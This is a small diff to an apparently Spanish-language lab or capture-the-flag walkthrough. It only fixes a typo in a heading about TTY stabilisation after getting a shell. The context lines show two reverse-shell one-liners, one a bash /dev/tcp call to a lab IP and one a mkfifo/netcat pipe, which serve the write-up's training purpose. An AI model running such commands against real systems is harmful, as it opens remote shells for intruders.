@@ -188,7 +188,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.15.157/8001 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
 ```
 
-### despues de esto hacemos tratamiento tty y empezamos a examinar la maquina.
+### despues de esto hacemos TTtratamiento tty y empezamos a examinar la maquina.
 
 ###### vamos a navegar hasta el directorio donde esta alojada la base de datos
 passid:
